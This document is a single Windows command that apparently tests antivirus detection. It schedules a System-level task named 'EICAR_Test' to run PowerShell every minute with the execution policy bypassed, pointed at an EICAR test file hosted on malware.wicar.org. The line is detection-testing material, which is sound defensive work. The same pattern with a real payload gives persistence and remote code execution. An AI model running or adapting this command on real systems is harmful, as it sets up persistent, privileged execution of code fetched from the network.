schtasks /create /tn "EICAR_Test" /tr "powershell.exe -ExecutionPolicy Bypass -File http://malware.wicar.org/data/eicar.com" /sc minute /mo 1 /ru System
